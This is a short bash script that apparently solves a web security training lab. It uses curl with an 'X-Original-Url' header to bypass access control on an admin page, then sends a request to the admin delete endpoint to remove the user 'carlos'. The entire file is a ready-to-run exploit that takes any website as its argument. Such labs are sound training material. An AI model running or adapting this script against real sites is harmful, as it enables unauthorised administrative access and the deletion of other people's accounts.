#!/bin/bash

check_admin() {
    echo "(+) Checking the admin page..."
    response=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Original-Url: /admin" "${url}")
    if [[ "${response}" -eq 200 ]]; then
        echo "(+) Successfully accessed the admin page with the header 'X-Original-Url: /admin'"
    else
        echo "(-) Could not access the admin page!"
        echo "(-) Exiting"
        exit 1
    fi
}

delete_user() {
    echo "(+) Deleting user Carlos..."
    del_url="${url}/?username=carlos"
    response=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Original-Url: /admin/delete" "${del_url}")
    if [[ "${response}" -eq 302 ]]; then
        echo "(+) Successfully deleted user carlos"
    else
        echo "(-) Something went wrong! Could not delete user Carlos."
        echo "(-) Exiting..."
        exit 1
    fi
}

main() {
    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi
    
    echo "(+) Starting the script..."
    url="$1"
    check_admin "$url"
    delete_user "$url"
}
main "$@"